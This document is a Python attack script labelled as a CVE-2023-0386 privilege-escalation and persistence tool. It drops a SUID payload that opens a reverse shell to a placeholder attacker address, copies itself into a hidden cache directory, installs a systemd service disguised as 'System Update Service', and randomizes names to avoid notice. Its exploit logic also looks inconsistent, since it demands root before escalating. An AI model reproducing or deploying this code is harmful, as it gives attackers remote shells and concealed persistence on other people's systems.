#!/usr/bin/env python3
import os
import sys
import subprocess
import shutil
import time
import random
import string
from threading import Thread

# === RANDOMIZED VARIABLES ===
def random_name(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

PAYLOAD_TAG = random_name()
PAYLOAD_NAME = "." + random_name()
HIDDEN_DIR = os.path.expanduser(f"~/.cache/.{random_name()}")
HIDDEN_PAYLOAD = os.path.join(HIDDEN_DIR, PAYLOAD_NAME)

LOWERDIR = f"/tmp/.{random_name()}"
UPPERDIR = f"/tmp/.{random_name()}"
WORKDIR  = f"/tmp/.{random_name()}"
MERGED   = f"/tmp/.{random_name()}"
MERGED_SHELL = os.path.join(MERGED, PAYLOAD_NAME)

DEBUG = True
def log(msg):
    if DEBUG:
        print(f"[+] {msg}")

# === CORE EXPLOIT LOGIC ===
def setup_dirs():
    for d in [LOWERDIR, UPPERDIR, WORKDIR, MERGED, HIDDEN_DIR]:
        os.makedirs(d, exist_ok=True)

def cleanup_dirs():
    log("Cleaning up overlay mounts...")
    subprocess.run(["umount", MERGED], stderr=subprocess.DEVNULL)
    for d in [LOWERDIR, UPPERDIR, WORKDIR, MERGED]:
        shutil.rmtree(d, ignore_errors=True)

def drop_hidden_payload():
    log("Writing polymorphic SUID payload...")
    payload = (
        "#!/bin/bash\n"
        f"echo '[ROOT SHELL :: {PAYLOAD_TAG}]'\n"
        "bash -i >& /dev/tcp/YOUR.ATTACK.BOX.IP/4444 0>&1\n"
    )
    with open(HIDDEN_PAYLOAD, "w") as f:
        f.write(payload)
    os.chmod(HIDDEN_PAYLOAD, 0o4755)
    shutil.copy(HIDDEN_PAYLOAD, os.path.join(UPPERDIR, PAYLOAD_NAME))

def mount_overlay():
    log("Mounting overlay filesystem...")
    cmd = [
        "mount", "-t", "overlay", "overlay",
        "-o", f"lowerdir={LOWERDIR},upperdir={UPPERDIR},workdir={WORKDIR}",
        MERGED
    ]
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if result.returncode != 0:
        log("Mount failed. Kernel not vulnerable or run not as root.")
        sys.exit(1)

def execute_shell():
    if os.path.exists(MERGED_SHELL):
        log("Launching polymorphic root shell...")
        os.execv(MERGED_SHELL, [MERGED_SHELL])
    else:
        log("Root shell missing. Exploit may have failed.")

def suid_scanner_loop():
    log("👁 SUID Scanner loop engaged...")
    scanned = set()
    while True:
        time.sleep(7)
        try:
            result = subprocess.check_output("find / -perm -4000 -type f 2>/dev/null", shell=True)
            suids = result.decode().split("\n")
            for path in suids:
                path = path.strip()
                if not path or path in scanned:
                    continue
                scanned.add(path)
                try:
                    with open(path, "rb") as f:
                        content = f.read()
                        if PAYLOAD_TAG.encode() in content:
                            log(f"[SUID Scanner] Found tagged payload: {path}")
                            os.execv(path, [path])
                except Exception:
                    continue
        except Exception:
            continue

# === PERSISTENCE ===
def add_systemd_persistence(script_path):
    log("Installing persistent systemd service...")
    service_name = f"{random_name()}.service"
    service_path = f"/etc/systemd/system/{service_name}"

    service_contents = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {script_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""
    with open("/tmp/.sys_service", "w") as f:
        f.write(service_contents)

    subprocess.run(["mv", "/tmp/.sys_service", service_path])
    subprocess.run(["systemctl", "daemon-reexec"])
    subprocess.run(["systemctl", "enable", service_name])
    subprocess.run(["systemctl", "start", service_name])

def install_self():
    log("Installing self in hidden polymorphic path...")
    target_script = os.path.join(HIDDEN_DIR, f"{random_name()}.py")
    shutil.copy2(sys.argv[0], target_script)
    add_systemd_persistence(target_script)

# === MAIN ===
def main():
    if os.geteuid() != 0:
        print("❌ Must run as root.")
        sys.exit(1)

    print("🔥 POLYROOT: CVE-2023-0386 PRIV ESC + PERSISTENCE 🔥")

    install_self()
    Thread(target=suid_scanner_loop, daemon=True).start()

    try:
        setup_dirs()
        drop_hidden_payload()
        mount_overlay()
        time.sleep(1)
        execute_shell()
    finally:
        cleanup_dirs()

if __name__ == "__main__":
    main()
